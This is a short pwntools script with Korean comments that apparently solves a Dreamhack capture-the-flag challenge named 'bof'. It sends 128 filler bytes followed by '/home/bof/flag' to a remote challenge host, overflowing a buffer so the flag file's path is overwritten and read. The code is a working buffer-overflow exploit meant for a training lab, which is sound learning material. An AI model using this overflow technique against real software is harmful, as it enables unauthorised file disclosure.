from pwn import *

# 1. 접속 정보
# p = process('./bof') # 로컬 테스트 시
p = remote('host3.dreamhack.games', 11335)

# 2. 페이로드 구성
# 버퍼 크기(128)만큼 채우고 + 원하는 파일 경로 덮어쓰기
payload = b"A" * 128
payload += b"/home/bof/flag"

# 3. 데이터 전송
p.recvuntil("meow? ")
p.sendline(payload)

# 4. 결과 확인
p.interactive()